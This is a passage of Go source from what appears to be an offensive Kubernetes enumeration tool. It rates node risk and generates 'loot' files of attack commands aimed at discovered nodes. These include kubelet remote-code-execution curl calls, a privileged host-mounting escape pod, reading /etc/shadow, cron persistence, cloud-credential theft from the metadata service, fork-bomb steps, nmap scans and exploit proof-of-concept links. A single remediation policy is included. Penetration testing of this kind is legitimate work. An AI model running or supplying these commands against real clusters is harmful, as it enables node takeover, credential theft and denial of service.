	if cloudProvider == "AWS" || cloudProvider == "GCP" || cloudProvider == "Azure" {
		// In cloud environments, external IPs often indicate internet-facing nodes
		if analysis.IsExternallyExposed {
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Cloud node with external IP - potential attack surface for SSH, RDP, kubelet port 10250")
		}
	}

	return analysis
}

// buildAttackPaths generates attack path visualizations
func buildAttackPaths(finding NodeFinding, kubelet KubeletSecurityAnalysis, privileged PrivilegedWorkloadAnalysis, imds IMDSRiskAnalysis) []string {
	var paths []string

	// Path 1: Privileged pod escape
	if privileged.PrivilegedPods > 0 {
		paths = append(paths,
			fmt.Sprintf("Pod Escape: Privileged Pod (%s) → Container Breakout → Node Root Shell → Host Filesystem Access",
				limitString(strings.Join(privileged.PrivilegedPodNames, ", "), 50)))
	}

	// Path 2: Kubelet exploitation
	if kubelet.AnonymousAuth && finding.IsExternallyExposed {
		paths = append(paths,
			fmt.Sprintf("Node Takeover: Internet → Kubelet Port 10250 → Unauthenticated RCE → Node Root → etcd Access → Cluster Secrets"))
	} else if kubelet.AnonymousAuth {
		paths = append(paths,
			fmt.Sprintf("Node Takeover: Compromised Pod → Kubelet Port 10250 → RCE → Node Root → Cluster Admin"))
	}

	// Path 3: IMDS to cloud breakout
	if imds.RiskLevel == "CRITICAL" {
		paths = append(paths,
			fmt.Sprintf("Cloud Breakout: Any Pod → IMDS (%s) → %s Credentials → Cloud API → Full Account Compromise",
				imds.MetadataEndpoint, imds.CloudProvider))
	}

	// Path 4: HostPath escape
	if len(privileged.DangerousHostPaths) > 0 {
		paths = append(paths,
			fmt.Sprintf("Host Filesystem Access: Pod with hostPath → Mount / or /etc → Read /etc/shadow → Node Takeover"))
	}

	// Path 5: HostNetwork lateral movement
	if privileged.HostNetworkPods > 0 {
		paths = append(paths,
			fmt.Sprintf("Lateral Movement: hostNetwork Pod → Node Network Namespace → Other Nodes → Data Exfiltration"))
	}

	// Path 6: Resource exhaustion DoS
	if finding.ResourcePressure == "CRITICAL" {
		paths = append(paths,
			fmt.Sprintf("DoS: Resource Pressure → Deploy Fork Bomb Pod → Exhaust PIDs → Node Crash → Cluster Instability"))
	}

	return paths
}

// calculateNodeRiskLevel determines overall risk level for the node
func calculateNodeRiskLevel(
	finding NodeFinding,
	kubelet KubeletSecurityAnalysis,
	resource ResourceAnalysis,
	privileged PrivilegedWorkloadAnalysis,
	imds IMDSRiskAnalysis,
	network struct {
		IsExternallyExposed bool
		RiskLevel           string
		SecurityIssues      []string
	},
) string {
	riskScore := 0

	// CRITICAL FACTORS (50+ points)
	if kubelet.AnonymousAuth && network.IsExternallyExposed {
		riskScore += 100 // Exposed kubelet with anonymous auth = RCE from internet
	}
	if privileged.PrivilegedPods > 0 && network.IsExternallyExposed {
		riskScore += 90 // Privileged pods on internet-facing node
	}
	if imds.RiskLevel == "CRITICAL" {
		riskScore += 85 // Unrestricted IMDS = credential theft
	}
	if resource.ResourcePressure == "CRITICAL" {
		riskScore += 50 // PID pressure = fork bomb risk
	}

	// HIGH FACTORS (25-40 points)
	if kubelet.ReadOnlyPort > 0 {
		riskScore += 40 // Read-only port = secret exposure
	}
	if kubelet.AnonymousAuth {
		riskScore += 35 // Kubelet RCE from cluster
	}
	if privileged.PrivilegedPods > 0 {
		riskScore += 30 // Container escape risk
	}
	if len(finding.Vulnerabilities) > 0 {
		riskScore += 25 // Kernel/OS vulnerabilities
	}

	// MEDIUM FACTORS (10-20 points)
	if imds.RiskLevel == "HIGH" {
		riskScore += 20 // IMDS accessible
	}
	if len(privileged.DangerousHostPaths) > 0 {
		riskScore += 18 // Dangerous hostPath mounts
	}
	if privileged.HostNetworkPods > 0 {
		riskScore += 15 // Network namespace escape
	}
	if resource.ResourcePressure == "HIGH" {
		riskScore += 12 // Resource pressure
	}
	if network.IsExternallyExposed {
		riskScore += 10 // External IP
	}

	// Classify
	if riskScore >= 50 {
		return "CRITICAL"
	} else if riskScore >= 25 {
		return "HIGH"
	} else if riskScore >= 10 {
		return "MEDIUM"
	}
	return "LOW"
}

// generateTable creates the table output
func generateTable(findings []NodeFinding) internal.TableFile {
	headers := []string{
		"Risk Level",
		"Name",
		"Internal IP",
		"External IP",
		"Kubelet Security",
		"Privileged Pods",
		"Resource Pressure",
		"Current Pods",
		"OS/Kernel",
		"Runtime",
		"Kubelet Ver",
		"Cloud",
		"IMDS Risk",
		"External Exposure",
		"Taints",
		"Security Issues",
		"Vulnerabilities",
		"Attack Paths",
		"Labels",
		"Conditions",
	}

	var rows [][]string

	for _, f := range findings {
		// Kubelet security summary
		kubeletSecurity := "Secure"
		if f.KubeletAnonymousAuth {
			kubeletSecurity = "CRITICAL: Anonymous Auth"
		} else if f.KubeletReadOnlyPort > 0 {
			kubeletSecurity = fmt.Sprintf("HIGH: Read-Only Port %d", f.KubeletReadOnlyPort)
		} else if len(f.KubeletSecurityIssues) > 0 {
			kubeletSecurity = "Issues Found"
		}

		// Privileged pods summary
		privilegedSummary := "None"
		if f.PrivilegedPods > 0 || f.HostNetworkPods > 0 || f.HostPIDPods > 0 {
			privilegedSummary = fmt.Sprintf("Priv:%d Host-Net:%d Host-PID:%d",
				f.PrivilegedPods, f.HostNetworkPods, f.HostPIDPods)
		}

		// OS/Kernel summary
		osKernel := fmt.Sprintf("%s / %s", f.OSImage, f.KernelVersion)

		// External exposure
		externalExposure := "No"
		if f.IsExternallyExposed {
			externalExposure = fmt.Sprintf("Yes: %s", f.ExternalIP)
		}

		// Key labels (subset)
		keyLabels := extractKeyLabels(f.Labels)

		// Node conditions summary
		conditions := "Ready"
		if !f.IsReady {
			conditions = "Not Ready"
		}
		if f.HasDiskPressure {
			conditions += ", DiskPressure"
		}
		if f.HasMemoryPressure {
			conditions += ", MemoryPressure"
		}
		if f.HasPIDPressure {
			conditions += ", PIDPressure"
		}

		row := []string{
			f.RiskLevel,
			f.Name,
			f.InternalIP,
			k8sinternal.NonEmpty(f.ExternalIP),
			kubeletSecurity,
			privilegedSummary,
			f.ResourcePressure,
			fmt.Sprintf("%d/%d", f.CurrentPods, f.PodsAllocatable),
			limitString(osKernel, 60),
			limitString(f.ContainerRuntime, 30),
			f.KubeletVersion,
			fmt.Sprintf("%s (%s)", f.CloudProvider, f.CloudRole),
			f.IMDSAccessRisk,
			externalExposure,
			limitString(strings.Join(f.Taints, "; "), 100),
			limitString(strings.Join(f.SecurityIssues, "; "), 200),
			limitString(strings.Join(f.Vulnerabilities, "; "), 150),
			limitString(strings.Join(f.AttackPaths, " | "), 200),
			limitString(keyLabels, 100),
			conditions,
		}
		rows = append(rows, row)
	}

	// Sort by risk level, then name
	sort.SliceStable(rows, func(i, j int) bool {
		if rows[i][0] != rows[j][0] {
			return riskLevelValue(rows[i][0]) > riskLevelValue(rows[j][0])
		}
		return rows[i][1] < rows[j][1]
	})

	return internal.TableFile{
		Name:   "Nodes",
		Header: headers,
		Body:   rows,
	}
}

// generateLootFiles creates all loot files
func generateLootFiles(findings []NodeFinding) []internal.LootFile {
	var lootFiles []internal.LootFile

	// 1. Node-Enum.txt (enhanced)
	lootFiles = append(lootFiles, generateNodeEnumLoot(findings))

	// 2. Pod-YAMLs.txt (enhanced with privileged pods)
	lootFiles = append(lootFiles, generatePodYAMLsLoot(findings))

	// 3. Node-Security-Dashboard.txt (NEW)
	lootFiles = append(lootFiles, generateSecurityDashboardLoot(findings))

	// 4. Node-Kubelet-Vulnerabilities.txt (NEW)
	lootFiles = append(lootFiles, generateKubeletVulnerabilitiesLoot(findings))

	// 5. Node-Privileged-Workloads.txt (NEW)
	lootFiles = append(lootFiles, generatePrivilegedWorkloadsLoot(findings))

	// 6. Node-External-Exposure.txt (NEW)
	lootFiles = append(lootFiles, generateExternalExposureLoot(findings))

	// 7. Node-Resource-Pressure.txt (NEW)
	lootFiles = append(lootFiles, generateResourcePressureLoot(findings))

	// 8. Node-IMDS-Risk.txt (NEW)
	lootFiles = append(lootFiles, generateIMDSRiskLoot(findings))

	// 9. Node-Kernel-Vulnerabilities.txt (NEW)
	lootFiles = append(lootFiles, generateKernelVulnerabilitiesLoot(findings))

	// 10. Node-Attack-Paths.txt (NEW)
	lootFiles = append(lootFiles, generateAttackPathsLoot(findings))

	// 11. NMAP-Nodes.txt (NEW)
	lootFiles = append(lootFiles, generateNMAPLoot(findings))

	return lootFiles
}

func generateNodeEnumLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### Node Enumeration Commands")
	content = append(content, "#####################################")
	content = append(content, "")

	if globals.KubeContext != "" {
		content = append(content, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	content = append(content, "# List all nodes with security context")
	content = append(content, "kubectl get nodes -o wide")
	content = append(content, "")

	for _, f := range findings {
		content = append(content, fmt.Sprintf("# Node: %s (Risk: %s)", f.Name, f.RiskLevel))
		content = append(content, fmt.Sprintf("kubectl describe node %s", f.Name))
		content = append(content, fmt.Sprintf("kubectl get node %s -o json | jq '.status.conditions'", f.Name))
		content = append(content, "")

		if f.KubeletAnonymousAuth {
			content = append(content, fmt.Sprintf("# WARNING: Kubelet anonymous auth enabled - RCE available"))
			content = append(content, fmt.Sprintf("curl -k https://%s:10250/pods", f.InternalIP))
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Node-Enum",
		Contents: strings.Join(content, "\n"),
	}
}

func generatePodYAMLsLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### Pod YAMLs for Node Access")
	content = append(content, "#####################################")
	content = append(content, "")

	for _, f := range findings {
		// Build tolerations for the node's taints
		var tolerations []corev1.Toleration
		for _, taintStr := range f.Taints {
			parts := strings.Split(taintStr, ":")
			if len(parts) == 2 {
				keyValue := strings.Split(parts[0], "=")
				if len(keyValue) == 2 {
					tolerations = append(tolerations, corev1.Toleration{
						Key:      keyValue[0],
						Operator: corev1.TolerationOpEqual,
						Value:    keyValue[1],
						Effect:   corev1.TaintEffect(parts[1]),
					})
				}
			}
		}

		// Standard probe pod
		pod := corev1.Pod{
			TypeMeta: metav1.TypeMeta{
				APIVersion: "v1",
				Kind:       "Pod",
			},
			ObjectMeta: metav1.ObjectMeta{
				Name: fmt.Sprintf("probe-%s", f.Name),
			},
			Spec: corev1.PodSpec{
				NodeName:    f.Name,
				Tolerations: tolerations,
				Containers: []corev1.Container{
					{
						Name:    "alpine",
						Image:   "alpine:latest",
						Command: []string{"sh", "-c", "sleep 3600"},
					},
				},
			},
		}

		if yamlData, err := yaml.Marshal(pod); err == nil {
			content = append(content, fmt.Sprintf("# Standard Pod for Node: %s", f.Name))
			content = append(content, string(yamlData))
			content = append(content, "---")
		}

		// If node has privileged pods, create a privileged escape pod
		if f.PrivilegedPods > 0 {
			privileged := true
			escapePod := corev1.Pod{
				TypeMeta: metav1.TypeMeta{
					APIVersion: "v1",
					Kind:       "Pod",
				},
				ObjectMeta: metav1.ObjectMeta{
					Name: fmt.Sprintf("escape-%s", f.Name),
				},
				Spec: corev1.PodSpec{
					NodeName:    f.Name,
					Tolerations: tolerations,
					HostNetwork: true,
					HostPID:     true,
					HostIPC:     true,
					Containers: []corev1.Container{
						{
							Name:    "escape",
							Image:   "alpine:latest",
							Command: []string{"sh", "-c", "nsenter -t 1 -m -u -n -i sh"},
							SecurityContext: &corev1.SecurityContext{
								Privileged: &privileged,
							},
							VolumeMounts: []corev1.VolumeMount{
								{
									Name:      "host-root",
									MountPath: "/host",
								},
							},
						},
					},
					Volumes: []corev1.Volume{
						{
							Name: "host-root",
							VolumeSource: corev1.VolumeSource{
								HostPath: &corev1.HostPathVolumeSource{
									Path: "/",
								},
							},
						},
					},
				},
			}

			if yamlData, err := yaml.Marshal(escapePod); err == nil {
				content = append(content, fmt.Sprintf("# Privileged Escape Pod for Node: %s (Container Breakout)", f.Name))
				content = append(content, string(yamlData))
				content = append(content, "---")
			}
		}

		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Pod-YAMLs",
		Contents: strings.Join(content, "\n"),
	}
}

func generateSecurityDashboardLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         NODE SECURITY RISK DASHBOARD")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	// Count by risk level
	criticalCount := 0
	highCount := 0
	mediumCount := 0
	lowCount := 0

	for _, f := range findings {
		switch f.RiskLevel {
		case "CRITICAL":
			criticalCount++
		case "HIGH":
			highCount++
		case "MEDIUM":
			mediumCount++
		case "LOW":
			lowCount++
		}
	}

	content = append(content, "RISK SUMMARY:")
	content = append(content, fmt.Sprintf("  CRITICAL: %d nodes", criticalCount))
	content = append(content, fmt.Sprintf("  HIGH:     %d nodes", highCount))
	content = append(content, fmt.Sprintf("  MEDIUM:   %d nodes", mediumCount))
	content = append(content, fmt.Sprintf("  LOW:      %d nodes", lowCount))
	content = append(content, "")

	// Top risks
	content = append(content, "TOP SECURITY RISKS:")
	content = append(content, "")

	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" || f.RiskLevel == "HIGH" {
			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.RiskLevel))
			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
			if f.ExternalIP != "" {
				content = append(content, fmt.Sprintf("  External IP: %s (INTERNET EXPOSED)", f.ExternalIP))
			}
			content = append(content, fmt.Sprintf("  Cloud: %s (%s)", f.CloudProvider, f.CloudRole))
			content = append(content, "")
			content = append(content, "  Security Issues:")
			for _, issue := range f.SecurityIssues {
				content = append(content, fmt.Sprintf("    • %s", issue))
			}
			if len(f.Vulnerabilities) > 0 {
				content = append(content, "  Vulnerabilities:")
				for _, vuln := range f.Vulnerabilities {
					content = append(content, fmt.Sprintf("    • %s", vuln))
				}
			}
			if len(f.AttackPaths) > 0 {
				content = append(content, "  Attack Paths:")
				for _, path := range f.AttackPaths {
					content = append(content, fmt.Sprintf("    → %s", path))
				}
			}
			content = append(content, "")
			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Node-Security-Dashboard",
		Contents: strings.Join(content, "\n"),
	}
}

func generateKubeletVulnerabilitiesLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         KUBELET SECURITY VULNERABILITIES")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasVulnerabilities := false

	for _, f := range findings {
		if f.KubeletAnonymousAuth || f.KubeletReadOnlyPort > 0 || len(f.KubeletSecurityIssues) > 0 {
			hasVulnerabilities = true

			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.KubeletRiskLevel))
			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
			if f.ExternalIP != "" {
				content = append(content, fmt.Sprintf("  External IP: %s", f.ExternalIP))
			}
			content = append(content, fmt.Sprintf("  Kubelet Version: %s", f.KubeletVersion))
			content = append(content, "")

			if f.KubeletAnonymousAuth {
				content = append(content, "  ⚠️  CRITICAL: Anonymous Authentication Enabled")
				content = append(content, "")
				content = append(content, "  Exploitation:")
				content = append(content, fmt.Sprintf("    # List all pods"))
				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/pods", f.InternalIP))
				content = append(content, "")
				content = append(content, "    # Execute command in any pod")
				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=id\"", f.InternalIP))
				content = append(content, "")
				content = append(content, "    # Get node shell via pod")
				content = append(content, fmt.Sprintf("    curl -k https://%s:10250/run/<namespace>/<pod>/<container> -d \"cmd=nsenter -t 1 -m -u -n -i sh\"", f.InternalIP))
				content = append(content, "")
			}

			if f.KubeletReadOnlyPort > 0 {
				content = append(content, fmt.Sprintf("  ⚠️  HIGH: Read-Only Port %d Exposed", f.KubeletReadOnlyPort))
				content = append(content, "")
				content = append(content, "  Exploitation:")
				content = append(content, fmt.Sprintf("    # Get all pod specs (including secrets)"))
				content = append(content, fmt.Sprintf("    curl http://%s:%d/pods", f.InternalIP, f.KubeletReadOnlyPort))
				content = append(content, "")
			}

			if len(f.KubeletSecurityIssues) > 0 {
				content = append(content, "  Security Issues:")
				for _, issue := range f.KubeletSecurityIssues {
					content = append(content, fmt.Sprintf("    • %s", issue))
				}
				content = append(content, "")
			}

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasVulnerabilities {
		content = append(content, "✓ No critical kubelet vulnerabilities detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-Kubelet-Vulnerabilities",
		Contents: strings.Join(content, "\n"),
	}
}

func generatePrivilegedWorkloadsLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         PRIVILEGED WORKLOADS (Container Escape Risks)")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasPrivileged := false

	for _, f := range findings {
		if f.PrivilegedPods > 0 || f.HostNetworkPods > 0 || f.HostPIDPods > 0 || len(f.DangerousHostPaths) > 0 {
			hasPrivileged = true

			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.PrivilegedWorkloadRisk))
			content = append(content, "")

			if f.PrivilegedPods > 0 {
				content = append(content, fmt.Sprintf("  ⚠️  CRITICAL: %d Privileged Pods", f.PrivilegedPods))
				content = append(content, "  Pods:")
				for _, pod := range f.PrivilegedPodNames {
					content = append(content, fmt.Sprintf("    • %s", pod))
				}
				content = append(content, "")
				content = append(content, "  Container Escape Scenario:")
				content = append(content, "    1. kubectl exec -it <pod> -- sh")
				content = append(content, "    2. # In privileged container:")
				content = append(content, "    3. mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup")
				content = append(content, "    4. # Execute commands on host via release_agent exploit")
				content = append(content, "    5. # Or: nsenter -t 1 -m -u -n -i sh")
				content = append(content, "")
			}

			if len(f.DangerousHostPaths) > 0 {
				content = append(content, fmt.Sprintf("  ⚠️  HIGH: %d Pods with Dangerous hostPath Mounts", len(f.DangerousHostPaths)))
				content = append(content, "  Mounts:")
				for _, path := range f.DangerousHostPaths {
					content = append(content, fmt.Sprintf("    • %s", path))
				}
				content = append(content, "")
				content = append(content, "  Host Filesystem Access Scenario:")
				content = append(content, "    1. kubectl exec -it <pod> -- sh")
				content = append(content, "    2. cat /host/etc/shadow  # Read sensitive files")
				content = append(content, "    3. echo 'malicious cron' >> /host/etc/crontab  # Persistence")
				content = append(content, "")
			}

			if f.HostNetworkPods > 0 {
				content = append(content, fmt.Sprintf("  ⚠️  MEDIUM: %d hostNetwork Pods (Lateral Movement)", f.HostNetworkPods))
				content = append(content, "  Impact: Network namespace escape - can sniff node traffic")
				content = append(content, "")
			}

			if f.HostPIDPods > 0 {
				content = append(content, fmt.Sprintf("  ⚠️  MEDIUM: %d hostPID Pods", f.HostPIDPods))
				content = append(content, "  Impact: PID namespace escape - can see and signal host processes")
				content = append(content, "")
			}

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasPrivileged {
		content = append(content, "✓ No privileged workloads detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-Privileged-Workloads",
		Contents: strings.Join(content, "\n"),
	}
}

func generateExternalExposureLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         NODES WITH EXTERNAL EXPOSURE")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasExposure := false

	for _, f := range findings {
		if f.IsExternallyExposed {
			hasExposure = true

			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.ExposureRisk))
			content = append(content, fmt.Sprintf("  Internal IP: %s", f.InternalIP))
			content = append(content, fmt.Sprintf("  External IP: %s", f.ExternalIP))
			content = append(content, fmt.Sprintf("  Cloud: %s (%s)", f.CloudProvider, f.CloudRole))
			content = append(content, "")

			content = append(content, "  Attack Surface:")
			content = append(content, "    • Port 22 (SSH) - Credential brute force")
			content = append(content, "    • Port 3389 (RDP) - Windows nodes")
			content = append(content, "    • Port 10250 (Kubelet) - RCE if anonymous auth enabled")
			content = append(content, "    • Port 10255 (Kubelet read-only) - Secret exposure")
			content = append(content, "    • Port 30000-32767 (NodePort range) - Service exposure")
			content = append(content, "")

			content = append(content, "  Reconnaissance Commands:")
			content = append(content, fmt.Sprintf("    nmap -sV -p 22,3389,10250,10255,30000-32767 %s", f.ExternalIP))
			content = append(content, fmt.Sprintf("    curl -k https://%s:10250/pods", f.ExternalIP))
			content = append(content, "")

			if len(f.NetworkSecurityIssues) > 0 {
				content = append(content, "  Security Issues:")
				for _, issue := range f.NetworkSecurityIssues {
					content = append(content, fmt.Sprintf("    • %s", issue))
				}
				content = append(content, "")
			}

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasExposure {
		content = append(content, "✓ No nodes with external IP exposure detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-External-Exposure",
		Contents: strings.Join(content, "\n"),
	}
}

func generateResourcePressureLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         NODE RESOURCE PRESSURE (DoS Risks)")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasPressure := false

	for _, f := range findings {
		if f.ResourcePressure == "CRITICAL" || f.ResourcePressure == "HIGH" {
			hasPressure = true

			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.ResourcePressure))
			content = append(content, fmt.Sprintf("  Pods: %d/%d (Allocatable)", f.CurrentPods, f.PodsAllocatable))
			content = append(content, fmt.Sprintf("  CPU: %s (Allocatable: %s)", f.CPUCapacity, f.CPUAllocatable))
			content = append(content, fmt.Sprintf("  Memory: %s (Allocatable: %s)", f.MemoryCapacity, f.MemoryAllocatable))
			content = append(content, "")

			if f.HasDiskPressure {
				content = append(content, "  ⚠️  Disk Pressure Detected")
				content = append(content, "  Impact: Pod eviction, image pull failures")
				content = append(content, "")
			}

			if f.HasMemoryPressure {
				content = append(content, "  ⚠️  Memory Pressure Detected")
				content = append(content, "  Impact: OOMKills, pod eviction")
				content = append(content, "")
			}

			if f.HasPIDPressure {
				content = append(content, "  ⚠️  PID Pressure Detected")
				content = append(content, "  Impact: Fork bomb vulnerability - node crash risk")
				content = append(content, "")
				content = append(content, "  Fork Bomb DoS Scenario:")
				content = append(content, "    1. Deploy pod: while true; do sleep 1 & done")
				content = append(content, "    2. Exhaust PID limit")
				content = append(content, "    3. Node becomes unresponsive")
				content = append(content, "    4. Cluster instability")
				content = append(content, "")
			}

			if len(f.ConditionIssues) > 0 {
				content = append(content, "  Condition Issues:")
				for _, issue := range f.ConditionIssues {
					content = append(content, fmt.Sprintf("    • %s", issue))
				}
				content = append(content, "")
			}

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasPressure {
		content = append(content, "✓ No critical resource pressure detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-Resource-Pressure",
		Contents: strings.Join(content, "\n"),
	}
}

func generateIMDSRiskLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         CLOUD METADATA (IMDS) ACCESS RISKS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasRisk := false

	for _, f := range findings {
		if f.IMDSAccessRisk == "CRITICAL" || f.IMDSAccessRisk == "HIGH" {
			hasRisk = true

			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.IMDSAccessRisk))
			content = append(content, fmt.Sprintf("  Cloud Provider: %s", f.CloudProvider))
			content = append(content, fmt.Sprintf("  Metadata Endpoint: %s", f.MetadataEndpoint))
			content = append(content, fmt.Sprintf("  IAM Role Attached: %t", f.IAMRoleAttached))
			content = append(content, "")

			if f.IMDSAccessRisk == "CRITICAL" {
				content = append(content, "  ⚠️  CRITICAL: No Network Policy Blocking IMDS")
				content = append(content, "  Impact: ALL pods can access cloud credentials")
				content = append(content, "")
			}

			content = append(content, "  Credential Theft Scenario:")
			switch f.CloudProvider {
			case "AWS":
				content = append(content, "    # From any pod:")
				content = append(content, "    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
				content = append(content, "    ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)")
				content = append(content, "    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
				content = append(content, "    # Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN")
				content = append(content, "    # Use with aws cli to escalate to cloud admin")
			case "GCP":
				content = append(content, "    # From any pod:")
				content = append(content, "    curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
				content = append(content, "    # Extract access_token")
				content = append(content, "    # Use with gcloud to escalate privileges")
			case "Azure":
				content = append(content, "    # From any pod:")
				content = append(content, "    curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
				content = append(content, "    # Extract access_token")
				content = append(content, "    # Use with az cli to escalate privileges")
			}
			content = append(content, "")

			content = append(content, "  Remediation:")
			content = append(content, "    # Block IMDS access with NetworkPolicy:")
			content = append(content, "    apiVersion: networking.k8s.io/v1")
			content = append(content, "    kind: NetworkPolicy")
			content = append(content, "    metadata:")
			content = append(content, "      name: deny-metadata-access")
			content = append(content, "    spec:")
			content = append(content, "      podSelector: {}")
			content = append(content, "      policyTypes:")
			content = append(content, "      - Egress")
			content = append(content, "      egress:")
			content = append(content, "      - to:")
			content = append(content, "        - ipBlock:")
			content = append(content, "            cidr: 0.0.0.0/0")
			content = append(content, "            except:")
			content = append(content, "            - 169.254.169.254/32")
			content = append(content, "")

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasRisk {
		content = append(content, "✓ No critical IMDS access risks detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-IMDS-Risk",
		Contents: strings.Join(content, "\n"),
	}
}

func generateKernelVulnerabilitiesLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         KERNEL AND OS VULNERABILITIES")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	hasVulns := false

	for _, f := range findings {
		if len(f.Vulnerabilities) > 0 {
			hasVulns = true

			content = append(content, fmt.Sprintf("Node: %s", f.Name))
			content = append(content, fmt.Sprintf("  OS: %s", f.OSImage))
			content = append(content, fmt.Sprintf("  Kernel: %s", f.KernelVersion))
			content = append(content, fmt.Sprintf("  Runtime: %s", f.ContainerRuntime))
			content = append(content, "")

			content = append(content, "  Vulnerabilities:")
			for _, vuln := range f.Vulnerabilities {
				content = append(content, fmt.Sprintf("    • %s", vuln))
			}
			content = append(content, "")

			content = append(content, "  Exploitation Resources:")
			for _, vuln := range f.Vulnerabilities {
				if strings.Contains(vuln, "DirtyCOW") {
					content = append(content, "    • DirtyCOW: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs")
				}
				if strings.Contains(vuln, "DirtyPipe") {
					content = append(content, "    • DirtyPipe: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits")
				}
				if strings.Contains(vuln, "CVE-2019-5736") {
					content = append(content, "    • runc escape: https://github.com/Frichetten/CVE-2019-5736-PoC")
				}
			}
			content = append(content, "")

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	if !hasVulns {
		content = append(content, "✓ No known kernel/OS vulnerabilities detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Node-Kernel-Vulnerabilities",
		Contents: strings.Join(content, "\n"),
	}
}

func generateAttackPathsLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         COMPLETE ATTACK PATHS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	for _, f := range findings {
		if len(f.AttackPaths) > 0 {
			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.RiskLevel))
			content = append(content, "")

			for i, path := range f.AttackPaths {
				content = append(content, fmt.Sprintf("  Attack Path %d:", i+1))
				content = append(content, fmt.Sprintf("    %s", path))
				content = append(content, "")
			}

			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Node-Attack-Paths",
		Contents: strings.Join(content, "\n"),
	}
}

func generateNMAPLoot(findings []NodeFinding) internal.LootFile {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### NMAP Commands for Nodes")
	content = append(content, "#####################################")
	content = append(content, "")

	for _, f := range findings {
		if f.IsExternallyExposed {
			content = append(content, fmt.Sprintf("# Node: %s (External IP: %s)", f.Name, f.ExternalIP))
			content = append(content, "# Full port scan")
			content = append(content, fmt.Sprintf("nmap -sV -p- %s", f.ExternalIP))
			content = append(content, "")
			content = append(content, "# Kubernetes-specific ports")
			content = append(content, fmt.Sprintf("nmap -sV -p 22,3389,6443,10250,10255,30000-32767 %s", f.ExternalIP))
			content = append(content, "")
		} else if f.InternalIP != "" {
			content = append(content, fmt.Sprintf("# Node: %s (Internal IP: %s)", f.Name, f.InternalIP))
			content = append(content, "# From within cluster:")
			content = append(content, fmt.Sprintf("nmap -sV -p 10250,10255 %s", f.InternalIP))
			content = append(content, "")
